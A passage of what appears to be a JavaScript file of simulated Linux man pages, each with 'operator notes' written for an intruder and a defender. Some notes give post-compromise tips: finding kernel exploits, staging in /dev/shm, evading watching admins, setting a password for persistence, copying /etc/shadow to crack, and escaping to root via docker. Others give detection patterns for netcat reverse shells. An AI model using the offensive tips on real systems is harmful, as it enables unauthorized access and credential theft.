       Some networks block ICMP - try nmap -sn for host discovery.

SEE ALSO
       traceroute(8), netstat(8)`,

            // System Info
            'uname': `UNAME(1)                        User Commands                       UNAME(1)

NAME
       uname - print system information

SYNOPSIS
       uname [OPTION]...

DESCRIPTION
       Print certain system information. With no OPTION, same as -s.

       -a, --all
              print all information

       -s, --kernel-name
              print the kernel name

       -n, --nodename
              print the network node hostname

       -r, --kernel-release
              print the kernel release

       -v, --kernel-version
              print the kernel version

       -m, --machine
              print the machine hardware name

       -o, --operating-system
              print the operating system

EXAMPLES
       uname -a
              Print all system info (most common usage).

       uname -r
              Print kernel version (useful for exploit research).

OUTPUT EXAMPLE
       Linux hostname 5.15.0-generic #1 SMP x86_64 GNU/Linux
       |      |       |              |   |        |
       kernel nodename release       ver arch     OS

OPERATOR NOTES
       Use uname when you need to:
       • Identify target OS and kernel version
       • Find kernel exploits (searchsploit linux kernel X.X)
       • Determine architecture (x86_64, arm, etc.)

       Pro tip: uname -r is critical for privilege escalation.
       Search for kernel exploits: searchsploit linux kernel $(uname -r)
       Dirty COW, DirtyCred, various kernel exploits target specific versions.

SEE ALSO
       hostname(1), arch(1)`,

            'hostname': `HOSTNAME(1)                     User Commands                     HOSTNAME(1)

NAME
       hostname - show or set the system's host name

SYNOPSIS
       hostname [name]

DESCRIPTION
       Hostname is used to display the system's DNS name, and to display
       or set its hostname.

       -f, --fqdn
              Display the FQDN (Fully Qualified Domain Name)

       -i, --ip-address
              Display the IP address(es) of the host

       -d, --domain
              Display the DNS domain name

EXAMPLES
       hostname
              Show current hostname.

       hostname -f
              Show fully qualified domain name.

       hostname -i
              Show IP addresses.

OPERATOR NOTES
       Use hostname when you need to:
       • Identify the system you've compromised
       • Understand network position (naming conventions)
       • Correlate with other reconnaissance

       Pro tip: Hostnames often reveal purpose:
       web01, db-master, mail.corp, dc01.domain.local
       This helps map the network and identify high-value targets.

SEE ALSO
       uname(1), domainname(1)`,

            'uptime': `UPTIME(1)                       User Commands                       UPTIME(1)

NAME
       uptime - tell how long the system has been running

SYNOPSIS
       uptime [options]

DESCRIPTION
       uptime gives a one line display of: current time, how long the
       system has been running, how many users are logged on, and the
       system load averages for the past 1, 5, and 15 minutes.

       -p, --pretty
              show uptime in pretty format

       -s, --since
              system up since, in yyyy-mm-dd HH:MM:SS format

EXAMPLES
       uptime
              Show uptime with load averages.

       uptime -p
              Show uptime in human-readable format.

       uptime -s
              Show when system started.

OUTPUT EXAMPLE
        14:30:15 up 45 days, 3:12,  2 users,  load average: 0.15, 0.10, 0.08
        |        |                  |         |
        time     uptime             users     load (1m, 5m, 15m)

OPERATOR NOTES
       Use uptime when you need to:
       • Check system stability (long uptime = stable target)
       • Determine when reboots occurred
       • Assess load for timing attacks

       Pro tip: Long uptime may mean unpatched vulnerabilities.
       Systems that haven't rebooted in months likely have unpatched
       kernel vulnerabilities requiring reboot to apply.

SEE ALSO
       w(1), top(1), who(1)`,

            'df': `DF(1)                           User Commands                          DF(1)

NAME
       df - report file system disk space usage

SYNOPSIS
       df [OPTION]... [FILE]...

DESCRIPTION
       df displays the amount of disk space available on the file system
       containing each file name argument.

       -h, --human-readable
              print sizes in powers of 1024 (e.g., 1023M)

       -a, --all
              include pseudo, duplicate, inaccessible file systems

       -T, --print-type
              print file system type

       -i, --inodes
              list inode information instead of block usage

EXAMPLES
       df -h
              Show disk usage in human-readable format.

       df -hT
              Show with filesystem types.

       df -h /home
              Show usage for specific mount point.

OUTPUT EXAMPLE
       Filesystem      Size  Used Avail Use% Mounted on
       /dev/sda1       50G   35G   15G  70% /
       /dev/sdb1      100G   80G   20G  80% /data

OPERATOR NOTES
       Use df when you need to:
       • Check available space for staging/exfiltration
       • Identify mounted filesystems and partitions
       • Find network mounts (NFS, CIFS) that may have different permissions

       Pro tip: Look for interesting mount points:
       /mnt, /media - removable/network storage
       /home - user data
       tmpfs on /dev/shm - world-writable shared memory (useful for staging)

SEE ALSO
       du(1), mount(8)`,

            'du': `DU(1)                           User Commands                          DU(1)

NAME
       du - estimate file space usage

SYNOPSIS
       du [OPTION]... [FILE]...

DESCRIPTION
       Summarize disk usage of the set of FILEs, recursively for directories.

       -h, --human-readable
              print sizes in human readable format (e.g., 1K 234M 2G)

       -s, --summarize
              display only a total for each argument

       -a, --all
              write counts for all files, not just directories

       -c, --total
              produce a grand total

       -d, --max-depth=N
              print total for directory only if it is N or fewer levels

EXAMPLES
       du -sh *
              Show size of each item in current directory.

       du -h --max-depth=1 /home
              Show size of each user's home directory.

       du -sh /var/log
              Total size of logs directory.

       du -ah | sort -rh | head -20
              Find 20 largest files/directories.

OPERATOR NOTES
       Use du when you need to:
       • Find large files for exfiltration assessment
       • Locate space-consuming logs to review
       • Identify unusual disk usage patterns

       Pro tip: Find big files quickly:
       du -ah /home | sort -rh | head -20
       Large unexpected files may be data caches, databases, or archives.

SEE ALSO
       df(1), ls(1)`,

            'free': `FREE(1)                         User Commands                        FREE(1)

NAME
       free - display amount of free and used memory in the system

SYNOPSIS
       free [options]

DESCRIPTION
       free displays the total amount of free and used physical and swap
       memory in the system, as well as the buffers and caches used by
       the kernel.

       -h, --human
              show human-readable output

       -b, --bytes
              show output in bytes

       -m     show output in mebibytes

       -g     show output in gibibytes

       -s N, --seconds N
              continuously display every N seconds

EXAMPLES
       free -h
              Show memory in human-readable format.

       free -m
              Show memory in megabytes.

       free -h -s 5
              Monitor memory every 5 seconds.

OUTPUT EXAMPLE
              total    used    free  shared  buff/cache   available
Mem:           16G     8G      2G     500M        6G         7G
Swap:          4G      1G      3G

OPERATOR NOTES
       Use free when you need to:
       • Check if system has resources for your tools
       • Identify memory pressure (heavy swap = slow system)
       • Assess system capability before running memory-intensive tasks

       Pro tip: Low available memory + high swap usage indicates
       the system is struggling. Your tools may be slow or detected
       due to resource monitoring alerts.

SEE ALSO
       top(1), vmstat(8), htop(1)`,

            'w': `W(1)                            User Commands                           W(1)

NAME
       w - show who is logged on and what they are doing

SYNOPSIS
       w [options] [user]

DESCRIPTION
       w displays information about the users currently on the machine,
       and their processes.

       -h, --no-header
              Don't print the header

       -s, --short
              Use the short format

EXAMPLES
       w
              Show all logged in users and their activity.

       w -h
              Show without header.

       w username
              Show info for specific user only.

OUTPUT EXAMPLE
       USER     TTY     FROM            LOGIN@   IDLE   JCPU   PCPU WHAT
       admin    pts/0   192.168.1.50    09:30    0.00s  0.10s  0.01s vim
       root     pts/1   192.168.1.100   10:15    5:00   0.05s  0.01s -bash

       FROM = source IP address of SSH connection
       WHAT = current command being run

OPERATOR NOTES
       Use w when you need to:
       • See who else is on the system (avoid detection)
       • Check if admins are actively watching
       • Identify other attackers on the same box

       Pro tip: If you see active admin sessions, be careful.
       Check what they're running - if they're in /var/log or
       running monitoring tools, they may detect you.

       OPSEC: Run w first to assess who's watching.

SEE ALSO
       who(1), uptime(1), last(1)`,

            'who': `WHO(1)                          User Commands                         WHO(1)

NAME
       who - show who is logged on

SYNOPSIS
       who [OPTION]... [FILE | ARG1 ARG2]

DESCRIPTION
       Print information about users who are currently logged in.

       -a, --all
              same as -b -d --login -p -r -t -T -u

       -b, --boot
              time of last system boot

       -H, --heading
              print line of column headings

       -u, --users
              list users logged in

EXAMPLES
       who
              Show logged in users.

       who -b
              Show last boot time.

       who -H
              Show with headers.

       who am i
              Show current session info.

OPERATOR NOTES
       Use who when you need to:
       • Quick check of logged in users
       • See login sources (IPs, terminals)
       • Check system boot time

       Pro tip: who is simpler than w, shows less detail.
       Use w for more info, who for quick checks.
       who -b useful for determining if system rebooted recently.

SEE ALSO
       w(1), users(1), last(1)`,

            // System/Process
            'ps': `PS(1)                           User Commands                          PS(1)

NAME
       ps - report a snapshot of the current processes

SYNOPSIS
       ps [options]

DESCRIPTION
       ps displays information about a selection of the active processes.

SIMPLE PROCESS SELECTION
       a      Select all processes with a tty.
       -A, -e Select all processes.
       -a     Select all except session leaders and not associated with terminal.
       x      Select processes without controlling ttys.

OUTPUT FORMAT CONTROL
       u      Display user-oriented format.
       -f     Full-format listing.
       -l     Long format.

EXAMPLES
       ps aux
              Show all processes for all users.

       ps -ef
              Full format listing of all processes.

       ps aux | grep nginx
              Find nginx processes.

       ps -u username
              Show processes for specific user.

OPERATOR NOTES
       Use ps when you need to:
       • List all running processes on a system
       • Find suspicious or malicious processes
       • Identify resource-heavy applications
       • Locate process IDs for killing or analysis

       Pro tip: ps aux is your process reconnaissance command.
       Look for: unusual process names, processes running as root,
       high CPU/memory consumers, scripts running from /tmp.
       ps aux | grep -E "(nc|ncat|netcat|perl|python)" # Suspicious
       ps auxf  # Show process tree (parent-child relationships)
       ps -eo pid,user,cmd --sort=-%mem | head  # Top memory users

SEE ALSO
       top(1), pgrep(1), kill(1)`,

            'top': `TOP(1)                          User Commands                         TOP(1)

NAME
       top - display Linux processes

SYNOPSIS
       top -hv|-bcEeHiOSs1 -d secs -n max -u|U user -p pids -o field -w [cols]

DESCRIPTION
       The  top  program  provides  a dynamic real-time view of a running
       system.  It can display system summary information as well as a list
       of processes or threads currently being managed by the Linux kernel.

INTERACTIVE COMMANDS
       k      Kill a process (prompts for PID and signal).
       r      Renice a process (change priority).
       q      Quit.
       h      Help.
       M      Sort by memory usage.
       P      Sort by CPU usage.
       N      Sort by PID.
       T      Sort by time.

EXAMPLES
       top
              Interactive process viewer.

       top -b -n 1
              Batch mode, one iteration.

       top -u username
              Show only user's processes.

OPERATOR NOTES
       Use top when you need to:
       • Monitor system resources in real-time
       • Identify CPU/memory-hungry processes
       • Watch for cryptocurrency miners or resource abuse
       • Investigate system performance issues

       Pro tip: top reveals system health at a glance.
       Watch the load average (should be < number of CPUs).
       Press 'c' to show full command lines.
       Press '1' to show individual CPU cores.
       High %wa (I/O wait) suggests disk bottleneck.
       Cryptominers often max out CPU - look for unknown processes
       consuming 100% CPU with generic names.

SEE ALSO
       ps(1), htop(1), kill(1)`,

            'kill': `KILL(1)                         User Commands                        KILL(1)

NAME
       kill - send a signal to a process

SYNOPSIS
       kill [options] <pid> [...]

DESCRIPTION
       The default signal for kill is TERM.

       -s signal
              Specify the signal to be sent.

       -l, --list [signal]
              List signal names.

       -9     Send SIGKILL (cannot be caught or ignored).

       -15    Send SIGTERM (default, allows graceful shutdown).

SIGNALS
       1      HUP     Hangup
       2      INT     Interrupt
       9      KILL    Kill (cannot be caught)
       15     TERM    Terminate (default)
       18     CONT    Continue if stopped
       19     STOP    Stop process

EXAMPLES
       kill 1234
              Send SIGTERM to process 1234.

       kill -9 1234
              Force kill process 1234.

       kill -l
              List all signal names.

       kill -HUP $(cat /var/run/nginx.pid)
              Send HUP to nginx.

OPERATOR NOTES
       Use kill when you need to:
       • Terminate malicious or runaway processes
       • Stop miners, backdoors, or reverse shells
       • Gracefully restart services (HUP)
       • Force-stop unresponsive applications

       Pro tip: Start with SIGTERM (default), escalate to SIGKILL (-9).
       kill PID        # Ask nicely first
       kill -9 PID     # Force kill if that fails

       pkill and killall are useful alternatives:
       pkill -f "crypto"     # Kill by command name pattern
       killall python        # Kill all python processes

       Be careful - killing critical processes can crash the system.

SEE ALSO
       pkill(1), killall(1), ps(1), signal(7)`,

            'killall': `KILLALL(1)                      User Commands                      KILLALL(1)

NAME
       killall - kill processes by name

SYNOPSIS
       killall [-Z,--context pattern] [-e,--exact] [-g,--process-group]
               [-i,--interactive] [-o,--older-than TIME] [-q,--quiet]
               [-r,--regexp] [-s,--signal SIGNAL] [-u,--user user]
               [-v,--verbose] [-w,--wait] [-y,--younger-than TIME]
               [-I,--ignore-case] [-V,--version] [--] name ...

DESCRIPTION
       killall sends a signal to all processes running any of the specified
       commands. If no signal name is specified, SIGTERM is sent.

       -i, --interactive
              Ask for confirmation before killing.

       -q, --quiet
              Do not complain if no processes were killed.

       -r, --regexp
              Interpret process name as extended regular expression.

       -s, --signal SIGNAL
              Send this signal instead of SIGTERM.

       -u, --user user
              Kill only processes owned by user.

       -v, --verbose
              Report if signal was successfully sent.

       -w, --wait
              Wait for all killed processes to die.

EXAMPLES
       killall nginx
              Kill all nginx processes.

       killall -9 python
              Force kill all python processes.

       killall -u attacker
              Kill all processes owned by user 'attacker'.

       killall -i suspicious_process
              Interactive kill with confirmation.

       killall -r 'crypto.*'
              Kill processes matching regex pattern.

OPERATOR NOTES
       Use killall when you need to:
       • Kill all instances of a process by name
       • Stop multiple instances of malware
       • Clean up after an attack (kill backdoors)
       • Terminate all user sessions

       Pro tip: killall vs pkill:
       killall - requires exact process name match
       pkill   - matches against full command line, supports patterns

       Incident response: killall -u compromised_user
       This kills ALL processes owned by that user.

       WARNING: killall on some Unix systems (Solaris) kills ALL processes!
       On Linux it's safe and kills by name.

SEE ALSO
       kill(1), pkill(1), pgrep(1)`,

            'pkill': `PKILL(1)                        User Commands                       PKILL(1)

NAME
       pkill - look up or signal processes based on name and other attributes

SYNOPSIS
       pkill [options] pattern

DESCRIPTION
       pkill will send the specified signal (by default SIGTERM) to each
       process matching the pattern.

       -f, --full
              Match against full command line (not just process name).

       -u, --euid euid,...
              Match processes with effective user ID.

       -U, --uid uid,...
              Match processes with real user ID.

       -g, --pgroup pgrp,...
              Match processes in process group.

       -t, --terminal term,...
              Match processes controlled by terminal.

       -x, --exact
              Match exactly with the command name.

       -SIGNAL
              Signal to send (default: SIGTERM).

EXAMPLES
       pkill nginx
              Kill processes named nginx.

       pkill -9 -f "python script.py"
              Force kill processes with "python script.py" in command line.

       pkill -u attacker
              Kill all processes by user 'attacker'.

       pkill -t pts/0
              Kill all processes on terminal pts/0.

       pkill -f "/tmp/.*backdoor"
              Kill backdoors running from /tmp.

OPERATOR NOTES
       Use pkill when you need to:
       • Kill processes by pattern matching
       • Target processes by command line arguments (-f)
       • Kill all processes by a specific user
       • Terminate processes on a specific terminal

       Pro tip: pkill -f is more powerful than killall:
       pkill -f "nc -e"        # Kill netcat reverse shells
       pkill -f "crypto"       # Kill cryptominers
       pkill -f "/tmp/"        # Kill anything running from /tmp

       Incident response combo:
       pkill -u hacker && userdel hacker
       Kill all processes then delete the account.

       pgrep (same syntax) lists matching processes without killing:
       pgrep -fl nginx         # Show what would be killed

SEE ALSO
       pgrep(1), kill(1), killall(1)`,

            'last': `LAST(1)                         User Commands                        LAST(1)

NAME
       last, lastb - show listing of last logged in users

SYNOPSIS
       last [options] [username...] [tty...]

DESCRIPTION
       last searches back through the file /var/log/wtmp and displays a
       list of all users logged in (and out) since that file was created.

       lastb is the same as last, but shows failed login attempts from
       /var/log/btmp.

       -n num, --limit num
              Show only the specified number of lines.

       -f file, --file file
              Use a specific file instead of /var/log/wtmp.

       -x, --system
              Display shutdown and runlevel changes.

       -F, --fulltimes
              Display full login and logout times and dates.

EXAMPLES
       last
              Show all recent logins.

       last -n 20
              Show last 20 login entries.

       last username
              Show logins for specific user.

       last -x
              Show system reboots and shutdowns.

       lastb
              Show failed login attempts.

       last -f /var/log/wtmp.1
              Check old wtmp file.

OUTPUT FORMAT
       username   tty     from_ip        login_time - logout_time (duration)
       admin      pts/0   192.168.1.50   Mon Jan 15 09:30   still logged in

OPERATOR NOTES
       Use last when you need to:
       • See who has logged into the system
       • Track login times and sources
       • Identify suspicious login patterns
       • Find unauthorized access

       Pro tip: Key forensic commands:
       last                    # Recent logins
       lastb                   # Failed attempts (brute force evidence)
       last -x | grep reboot   # System reboots (covering tracks?)
       last root               # Root login history

       Look for: Unusual login times, unknown IPs, logins from
       unexpected locations, multiple failed attempts (lastb).

       Log files: /var/log/wtmp (logins), /var/log/btmp (failed)
       Attackers may delete these to hide activity.

SEE ALSO
       who(1), w(1), lastlog(8), utmp(5)`,

            'passwd': `PASSWD(1)                       User Commands                       PASSWD(1)

NAME
       passwd - change user password

SYNOPSIS
       passwd [options] [LOGIN]

DESCRIPTION
       passwd changes passwords for user accounts. A normal user may
       only change the password for their own account, while the
       superuser may change the password for any account.

       -l, --lock
              Lock the password of the named account.

       -u, --unlock
              Unlock the password of the named account.

       -d, --delete
              Delete user's password (make it empty).

       -e, --expire
              Immediately expire account's password.

       -S, --status
              Display account status information.

EXAMPLES
       passwd
              Change your own password.

       passwd username
              Change another user's password (requires root).

       passwd -l username
              Lock user account.

       passwd -u username
              Unlock user account.

       passwd -S username
              Check password status.

PASSWORD FILES
       /etc/passwd    User account information (readable by all)
       /etc/shadow    Encrypted passwords (root only)

       Shadow file format:
       username:$6$salt$hash:lastchange:min:max:warn:inactive:expire:

       Hash types:
       $1$  = MD5 (weak)
       $5$  = SHA-256
       $6$  = SHA-512 (current standard)

OPERATOR NOTES
       Use passwd when you need to:
       • Change passwords after compromise
       • Lock suspicious accounts
       • Create password for new persistence account

       Pro tip: Persistence via password change:
       As root: passwd username
       Set a password you know for later access.

       Forensic check:
       passwd -S username   # See if password changed recently
       chage -l username    # Detailed password aging info

       Password cracking target: /etc/shadow
       Copy off-system and crack with hashcat/john:
       cat /etc/shadow | grep -v '*' | grep -v '!'

SEE ALSO
       chage(1), shadow(5), usermod(8)`,

            'stat': `STAT(1)                         User Commands                        STAT(1)

NAME
       stat - display file or file system status

SYNOPSIS
       stat [OPTION]... FILE...

DESCRIPTION
       Display file or file system status.

       -c, --format=FORMAT
              use the specified FORMAT instead of the default

       -t, --terse
              print the information in terse form

       -f, --file-system
              display file system status instead of file status

FORMAT SEQUENCES
       %a     access rights in octal
       %A     access rights in human readable form
       %f     raw mode in hex
       %F     file type
       %n     file name
       %s     total size, in bytes
       %U     user name of owner
       %G     group name of owner
       %x     time of last access
       %y     time of last data modification
       %z     time of last status change

EXAMPLES
       stat file.txt
              Display detailed file information.

       stat -c "%a %U %G %n" file.txt
              Show octal permissions, owner, group, name.

       stat -c "%y" file.txt
              Show only modification time.

OUTPUT
       File: example.txt
       Size: 1234       Blocks: 8       IO Block: 4096   regular file
       Device: 802h/2050d  Inode: 12345   Links: 1
       Access: (0644/-rw-r--r--)  Uid: (1000/user)  Gid: (1000/user)
       Access: 2024-01-15 10:30:00.000000000 -0500
       Modify: 2024-01-15 09:15:30.000000000 -0500
       Change: 2024-01-15 09:15:30.000000000 -0500
        Birth: 2024-01-10 08:00:00.000000000 -0500

TIMESTAMPS
       Access (atime) - When file was last read
       Modify (mtime) - When file contents changed
       Change (ctime) - When metadata changed (permissions, ownership)
       Birth          - When file was created (if supported)

OPERATOR NOTES
       Use stat when you need to:
       • Get detailed file timestamps for forensics
       • Check exact permissions in octal
       • Identify file type and ownership
       • Detect timestamp manipulation

       Pro tip: Forensic timeline analysis:
       stat * | grep -E "(Access|Modify|Change):"
       Look for timestamps that don't make sense:
       - Modify time before Create time = timestomped
       - All times identical = suspicious
       - Access time = Modify time = never read after creation

       Compare timestamps: stat -c "%y %n" * | sort

SEE ALSO
       ls(1), touch(1), file(1)`,

            'file': `FILE(1)                         User Commands                        FILE(1)

NAME
       file - determine file type

SYNOPSIS
       file [options] file...

DESCRIPTION
       file tests each argument in an attempt to classify it. There are
       three sets of tests, performed in this order: filesystem tests,
       magic tests, and language tests.

       -b, --brief
              Do not prepend filenames to output lines.

       -i, --mime
              Output MIME type strings.

       -L, --dereference
              Follow symbolic links.

       -z, --uncompress
              Try to look inside compressed files.

EXAMPLES
       file document.pdf
              Identify file type.

       file *
              Check all files in directory.

       file -i image.png
              Show MIME type.

       file /bin/ls
              Check if binary is ELF, statically/dynamically linked.

       file suspicious_file
              Identify unknown files.

OUTPUT EXAMPLES
       script.sh:    Bourne-Again shell script, ASCII text executable
       binary:       ELF 64-bit LSB executable, x86-64, dynamically linked
       archive.tar:  POSIX tar archive (GNU)
       image.png:    PNG image data, 800 x 600, 8-bit/color RGB
       document.pdf: PDF document, version 1.4
       data.enc:     data (encrypted or binary)

OPERATOR NOTES
       Use file when you need to:
       • Identify unknown files regardless of extension
       • Detect file type masquerading (exe renamed to txt)
       • Analyze malware samples
       • Find hidden executables

       Pro tip: Malware often disguises file types:
       file *           # Check everything
       file -b * | sort | uniq -c | sort -rn  # Type summary

       Suspicious findings:
       - ELF executables in /tmp
       - Scripts with wrong extensions
       - "data" type in unexpected places (encrypted/packed)

       Quick sweep for executables:
       file * | grep -E "(executable|script)"

SEE ALSO
       stat(1), ls(1), strings(1)`,

            'nohup': `NOHUP(1)                        User Commands                       NOHUP(1)

NAME
       nohup - run a command immune to hangups

SYNOPSIS
       nohup COMMAND [ARG]...

DESCRIPTION
       Run COMMAND, ignoring hangup signals (SIGHUP). When you close your
       terminal or SSH session, processes normally receive SIGHUP and
       terminate. nohup prevents this.

       If standard output is a terminal, output is appended to 'nohup.out'
       in the current directory, or $HOME/nohup.out if that fails.

       Use & at the end to run in background:
              nohup ./script.sh &

OPTIONS
       --help  Display help and exit.
       --version
              Output version information and exit.

EXAMPLES
       nohup ./monitor.sh &
              Run monitor.sh in background, immune to hangups.

       nohup python server.py > server.log 2>&1 &
              Run server, redirect all output to log file.

       nohup make -j4 &
              Run long build process that survives logout.

OPERATOR NOTES
       Use nohup when you need to:
       • Run persistent monitoring or collection scripts
       • Keep processes alive after closing SSH session
       • Run long-running tasks (builds, scans, transfers)
       • Maintain persistence (legitimately or for operations)

       Alternative methods for process persistence:
       • screen / tmux - Terminal multiplexers
       • disown        - Remove job from shell's job table
       • systemd       - Create service unit (permanent)
       • cron @reboot  - Run at system boot

       Check nohup processes later:
       jobs            # If still in same shell
       ps aux | grep nohup
       pgrep -f "your_command"

SEE ALSO
       signal(7), disown(1), screen(1), tmux(1)`,

            'pgrep': `PGREP(1)                        User Commands                       PGREP(1)

NAME
       pgrep - look up processes based on name and other attributes

SYNOPSIS
       pgrep [options] pattern

DESCRIPTION
       pgrep looks through the currently running processes and lists the
       process IDs which match the selection criteria.

OPTIONS
       -f     Match against full command line (not just process name).
       -l     List process name as well as process ID.
       -u user
              Match processes owned by user.
       -x     Only match processes whose name exactly matches pattern.

EXAMPLES
       pgrep nginx
              Find PIDs of nginx processes.

       pgrep -f "python server"
              Find processes with "python server" in command line.

       pgrep -l sshd
              List sshd PIDs with process names.

OPERATOR NOTES
       Use pgrep to quickly find PIDs for:
       • Hunting malicious processes (miners, backdoors)
       • Verifying services are running
       • Scripting process management

       Combine with kill:
       kill $(pgrep crypto)     # Kill all crypto miners
       pkill -9 -f backdoor     # Force kill backdoors

SEE ALSO
       ps(1), pkill(1), kill(1), grep(1)`,

            'jobs': `JOBS(1)                       Bash Builtins                        JOBS(1)

NAME
       jobs - display status of jobs in the current session

SYNOPSIS
       jobs [-lnprs] [jobspec ...]

DESCRIPTION
       Lists the active jobs. The -l option lists process IDs in addition
       to the normal information. The -p option lists only process IDs.

       Without options, the status of all active jobs is displayed.

       [n]+  - Current job (most recently stopped/backgrounded)
       [n]-  - Previous job

EXAMPLES
       jobs
              List all jobs.

       jobs -l
              List jobs with PIDs.

OPERATOR NOTES
       Use jobs when you need to:
       • Track background processes you've started
       • Find stopped (suspended) tasks
       • Manage multiple concurrent operations

       Pro tip: Job control is essential for multitasking:
       sleep 100 &       # Start in background, get [1] 1234
       jobs              # See what's running
       Ctrl+Z            # Suspend current process
       bg %1             # Resume job 1 in background
       fg %1             # Bring job 1 to foreground

SEE ALSO
       fg(1), bg(1), kill(1)`,

            'fg': `FG(1)                         Bash Builtins                          FG(1)

NAME
       fg - move job to the foreground

SYNOPSIS
       fg [jobspec]

DESCRIPTION
       Move the specified job to the foreground, making it the current job.
       If no job is specified, uses the current job (most recently stopped
       or backgrounded).

       Job specifiers:
       %n     Job number n
       %str   Job whose command begins with str
       %%     Current job
       %+     Current job
       %-     Previous job

EXAMPLES
       fg
              Bring current job to foreground.

       fg %1
              Bring job 1 to foreground.

       fg %vim
              Bring the vim job to foreground.

OPERATOR NOTES
       Use fg when you need to:
       • Resume a suspended process (after Ctrl+Z)
       • Interact with a backgrounded process
       • Check on a long-running task

       Pro tip: Workflow for suspending and resuming:
       vim file.txt      # Start editing
       Ctrl+Z            # Suspend vim (shows [1]+ Stopped)
       ls -la            # Do other stuff
       fg                # Resume vim right where you left off

SEE ALSO
       bg(1), jobs(1)`,

            'bg': `BG(1)                         Bash Builtins                          BG(1)

NAME
       bg - move job to the background

SYNOPSIS
       bg [jobspec ...]

DESCRIPTION
       Resume the specified stopped job in the background, as if it had been
       started with &. If no job is specified, uses the current job.

EXAMPLES
       bg
              Resume current job in background.

       bg %1
              Resume job 1 in background.

OPERATOR NOTES
       Use bg when you need to:
       • Continue a stopped process without blocking your terminal
       • Let a long-running task complete while you work
       • Convert a foreground process to background

       Pro tip: Common workflow:
       ./long_script.sh  # Oops, forgot the &
       Ctrl+Z            # Suspend it
       bg                # Let it run in background
       # Now you can use your terminal while it runs

       Remember: Background jobs may still print to your terminal.
       Redirect output to avoid: cmd > output.log 2>&1 &

SEE ALSO
       fg(1), jobs(1)`,

            'chage': `CHAGE(1)                        User Commands                       CHAGE(1)

NAME
       chage - change user password expiry information

SYNOPSIS
       chage [options] LOGIN

DESCRIPTION
       The chage command changes the number of days between password changes
       and the date of the last password change. This information is used
       by the system to determine when a user must change their password.

OPTIONS
       -l, --list
              Show account aging information.

       -d, --lastday LAST_DAY
              Set date of last password change.

       -E, --expiredate EXPIRE_DATE
              Set account expiration date.

       -I, --inactive INACTIVE
              Set password inactive after expiration.

       -m, --mindays MIN_DAYS
              Set minimum days between password changes.

       -M, --maxdays MAX_DAYS
              Set maximum days between password changes.

       -W, --warndays WARN_DAYS
              Set number of days of warning before password expires.

EXAMPLES
       chage -l admin
              View password aging info for admin.

       chage -M 90 admin
              Set password to expire every 90 days.

       chage -E 2026-12-31 admin
              Set account to expire on Dec 31, 2026.

       chage -d 0 admin
              Force password change on next login.

OUTPUT OF chage -l
       Last password change                : Jan 15, 2026
       Password expires                    : never
       Password inactive                   : never
       Account expires                     : never
       Minimum days between change         : 0
       Maximum days between change         : 99999
       Warning before expiration           : 7

OPERATOR NOTES
       Use chage when you need to:
       • Audit when passwords were last changed
       • Determine if accounts have expired
       • Check password policies
       • Investigate recent account activity

       Pro tip: Forensic goldmine:
       chage -l username                   # When was password changed?
       for u in $(cut -d: -f1 /etc/passwd); do echo "==$u=="; chage -l $u; done
       Look for: recent password changes during incident timeframe,
       accounts with no expiration (persistence), accounts set to expire soon.

       If password was changed around incident time, that account may be
       compromised or used for persistence.

SEE ALSO
       passwd(1), shadow(5)`,

            'chmod': `CHMOD(1)                        User Commands                       CHMOD(1)

NAME
       chmod - change file mode bits

SYNOPSIS
       chmod [OPTION]... MODE[,MODE]... FILE...
       chmod [OPTION]... OCTAL-MODE FILE...

DESCRIPTION
       chmod changes the file mode bits of each given file according to mode.

       Numeric mode uses octal numbers:
       4 = read (r)
       2 = write (w)
       1 = execute (x)

       Symbolic mode uses letters:
       u = user/owner
       g = group
       o = others
       a = all

       + = add permission
       - = remove permission
       = = set exact permission

EXAMPLES
       chmod 755 script.sh
              rwxr-xr-x (owner: rwx, group: rx, others: rx)

       chmod 644 file.txt
              rw-r--r-- (owner: rw, group: r, others: r)

       chmod +x script.sh
              Add execute permission for all.

       chmod u+x,g-w file
              Add execute for owner, remove write for group.

       chmod -R 755 directory/
              Recursively change permissions.

OPERATOR NOTES
       Use chmod when you need to:
       • Make scripts executable
       • Secure sensitive files (restrict access)
       • Fix permission issues
       • Identify permission-based vulnerabilities

       Pro tip: Memorize these common permission sets:
       755 - Executables, scripts (rwxr-xr-x)
       644 - Regular files (rw-r--r--)
       600 - Private files like keys (rw-------)
       777 - DANGER! World-writable (never use in production)

       Security check: find / -perm -o+w  # World-writable files
       SUID bit (4xxx): chmod 4755 file  # Runs as file owner (dangerous)

SEE ALSO
       chown(1), chgrp(1), stat(1)`,

            'chown': `CHOWN(1)                        User Commands                       CHOWN(1)

NAME
       chown - change file owner and group

SYNOPSIS
       chown [OPTION]... [OWNER][:[GROUP]] FILE...

DESCRIPTION
       chown changes the user and/or group ownership of each given file.

       -R, --recursive
              operate on files and directories recursively

       -v, --verbose
              output a diagnostic for every file processed

EXAMPLES
       chown root file.txt
              Change owner to root.

       chown root:admin file.txt
              Change owner to root, group to admin.

       chown :developers file.txt
              Change only the group.

       chown -R www-data:www-data /var/www
              Recursively change ownership.

OPERATOR NOTES
       Use chown when you need to:
       • Change file ownership after copying or creating files
       • Fix ownership issues on web directories
       • Transfer file ownership between users
       • Investigate unusual file ownership patterns

       Pro tip: chown requires root for changing to other users.
       Common ownership patterns to know:
       www-data:www-data  - Web server files (Apache/Nginx)
       root:root          - System files
       mysql:mysql        - Database files

       Suspicious: files in /tmp owned by root, or user files
       owned by www-data may indicate web shell activity.
       find / -user www-data -type f 2>/dev/null  # Web server's files

SEE ALSO
       chmod(1), chgrp(1)`,

            // Identity & Privilege Escalation
            'id': `ID(1)                           User Commands                          ID(1)

NAME
       id - print real and effective user and group IDs

SYNOPSIS
       id [OPTION]... [USER]

DESCRIPTION
       Print user and group information for the specified USER, or (when USER
       omitted) for the current user.

       -u, --user
              print only the effective user ID

       -g, --group
              print only the effective group ID

       -G, --groups
              print all group IDs

       -n, --name
              print a name instead of a number, for -ugG

       -r, --real
              print the real ID instead of the effective ID, with -ugG

OUTPUT FORMAT
       Without options, output looks like:
       uid=1000(username) gid=1000(groupname) groups=1000(groupname),27(sudo)

       uid    = User ID (0 = root)
       gid    = Primary group ID
       groups = All group memberships

EXAMPLES
       id
              Show current user's identity.

       id root
              Show root's user and group info.

       id -u
              Print just the user ID number.

       id -Gn
              Print all group names (useful for privilege check).

OPERATOR NOTES
       Use id when you need to:
       • Verify your current access level on a compromised system
       • Check if you're in privileged groups (sudo, wheel, admin, docker)
       • Understand what resources you can access
       • First command to run after gaining a shell

       Pro tip: Key groups that grant elevated privileges:
       sudo/wheel  - Can run commands as root
       docker      - Can escape to root via containers
       lxd         - Can escape to root via containers
       disk        - Raw disk access (read anything)
